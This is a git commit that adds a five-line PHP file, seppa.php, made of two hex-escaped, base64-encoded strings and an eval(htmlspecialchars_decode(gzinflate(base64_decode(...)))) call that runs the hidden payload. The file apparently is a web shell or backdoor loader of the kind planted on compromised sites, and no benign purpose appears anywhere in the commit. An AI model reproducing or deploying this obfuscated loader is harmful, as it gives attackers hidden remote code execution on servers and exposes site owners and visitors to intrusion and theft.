b063bfbf22ccaa82fbd1ad0c2867ed1164793ff9
sentapabis <ayamtenggen21@gmail.com>
2024-10-18 17:36:17 +0700

    Create seppa.php

---
+++ seppa.php
@@ -0,0 +1,5 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "FS\x63KgkjvKkj\x622idv77K\x420\x2bRv\x61\x62slqrhPGWlkEPUzqrI6zu0/Z0q\x41U\x61HERltyw8dPqf\x61d2Y4K0yX\x63llVSy5SPIytoH\x61WuT0mrL2\x63KvHqG/q\x43ogNWR18j0q\x614j91\x43TOL4S\x42J\x42ZhnLvSErP\x2br3KoI6IS9E/pZ\x42TV81vpewx68m\x42UOW4PZjp5z\x42/FdpwMw/y\x43zwE8Xtzs08xYknI\x2bf\x633\x61GE\x42zuEzup\x638sRUkgkredG3x2\x42sfLgpN\x63G707JLyH\x63LLujgX\x41MK\x2b2k4UYUer2LmqK/XFrHENvMWzfEL\x42fm5dg6\x43FZJsmwZKmT\x41uXg3k9kIo8/I09EH\x2bxmH2xK4nJMPROoS95U\x41RtnQwkWxq\x61RnKJJxp\x2bwDQwv3I\x41FQ1v1KlSQL\x630\x43I\x61MGj2JgZUJOJyWlR19pN8OEhKTyJiMM\x42hgq4\x61fy/Y6JnX\x43PnDy\x41VYDDe\x42i1ef/O\x43r\x61xs4JTlUSoY86z16JG5ktRSK/ugd46DVrKE0D9vw7Fi\x42M\x43vWXS2o/ZGgZ\x42wJe\x2b7Y\x41xFg/JGgd\x42wJe\x2b7X\x41\x42Gg/5Fgh\x42wJe\x2b7W\x41RGg/pFgl\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+?>
